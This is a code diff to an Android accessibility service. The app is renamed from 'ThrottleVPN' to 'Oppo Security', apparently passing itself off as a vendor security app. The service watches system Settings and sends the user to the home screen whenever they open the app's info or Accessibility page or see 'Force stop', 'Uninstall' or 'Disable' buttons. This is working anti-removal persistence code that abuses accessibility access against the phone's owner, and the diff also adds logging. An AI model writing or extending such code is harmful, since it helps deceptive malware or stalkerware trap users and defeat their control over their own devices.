@@ -1,13 +1,19 @@
 package com.yourdomain.throttlingapp
 
 import android.accessibilityservice.AccessibilityService
+import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 
 class ProtectionAccessibilityService : AccessibilityService() {
 
-    private val myAppName = "ThrottleVPN" // Match app title
+    private val myAppName = "Oppo Security" // Match app title
     private val settingsPackageName = "com.android.settings"
+
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        Log.i(TAG, "ProtectionAccessibilityService connected and actively listening.")
+    }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
@@ -16,36 +22,54 @@ class ProtectionAccessibilityService : AccessibilityService() {
 
         // Intercept when user is inside system Settings
         if (packageName == settingsPackageName) {
-            val rootNode = rootInActiveWindow ?: return
+            Log.d(TAG, "Settings event detected: eventType=${event.eventType}, className=${event.className}")
+
+            val rootNode = rootInActiveWindow
+            if (rootNode == null) {
+                Log.d(TAG, "rootInActiveWindow is null. Skipping node inspection.")
+                return
+            }
 
             if (isAttemptingTamper(rootNode)) {
-                // Instantly send user back to the home screen
+                Log.w(TAG, "Tamper attempt detected in Settings! Executing GLOBAL_ACTION_HOME.")
                 performGlobalAction(GLOBAL_ACTION_HOME)
             }
         }
     }
 
     private fun isAttemptingTamper(node: AccessibilityNodeInfo): Boolean {
-        // 1. Check if user opened App Info for this app
+        // 1. Check if user opened App Info or Settings page referencing this app
         val appMatches = node.findAccessibilityNodeInfosByText(myAppName)
+        Log.d(TAG, "Searching for app name '$myAppName': found ${appMatches.size} node(s).")
+
         if (appMatches.isNotEmpty()) {
-            return true
-        }
+            Log.i(TAG, "App match found for '$myAppName'. Evaluating specific tamper criteria...")
 
-        // 2. Check if user is trying to turn off Accessibility for this service
-        // Matches screen titles or toggle entries referencing your app name
-        val accessibilityMatches = node.findAccessibilityNodeInfosByText("Accessibility")
-        if (accessibilityMatches.isNotEmpty() && appMatches.isNotEmpty()) {
-            return true
-        }
+            // 2. Check if user is inside Accessibility settings referencing this service
+            val accessibilityMatches = node.findAccessibilityNodeInfosByText("Accessibility")
+            if (accessibilityMatches.isNotEmpty()) {
+                Log.w(TAG, "User accessed Accessibility settings page referencing '$myAppName'. Triggering protection.")
+                return true
+            }
 
-        // 3. Check for specific dangerous button IDs or localized text
-        val forceStopButtons = node.findAccessibilityNodeInfosByText("Force stop")
-        val uninstallButtons = node.findAccessibilityNodeInfosByText("Uninstall")
-        val disableButtons = node.findAccessibilityNodeInfosByText("Disable")
+            // 3. Check for specific dangerous action buttons
+            val forceStopButtons = node.findAccessibilityNodeInfosByText("Force stop")
+            val uninstallButtons = node.findAccessibilityNodeInfosByText("Uninstall")
+            val disableButtons = node.findAccessibilityNodeInfosByText("Disable")
 
-        if ((forceStopButtons.isNotEmpty() || uninstallButtons.isNotEmpty() || disableButtons.isNotEmpty()) 
-            && appMatches.isNotEmpty()) {
+            val forceStopCount = forceStopButtons.size
+            val uninstallCount = uninstallButtons.size
+            val disableCount = disableButtons.size
+
+            Log.d(TAG, "Button matches: Force Stop=$forceStopCount, Uninstall=$uninstallCount, Disable=$disableCount")
+
+            if (forceStopCount > 0 || uninstallCount > 0 || disableCount > 0) {
+                Log.w(TAG, "Dangerous action button detected while on '$myAppName' page. Triggering protection.")
+                return true
+            }
+
+            // Fallback: Default block if the user is on our app's specific Settings/App Info page
+            Log.w(TAG, "User viewing '$myAppName' Settings page. Triggering baseline protection.")
             return true
         }
 
@@ -53,6 +77,15 @@ class ProtectionAccessibilityService : AccessibilityService() {
     }
 
     override fun onInterrupt() {
-        // Handle service interruption if needed
+        Log.w(TAG, "ProtectionAccessibilityService interrupted by system.")
+    }
+
+    override fun onDestroy() {
+        Log.i(TAG, "ProtectionAccessibilityService destroyed.")
+        super.onDestroy()
+    }
+
+    companion object {
+        private const val TAG = "ProtectionAccessService"
     }
 }
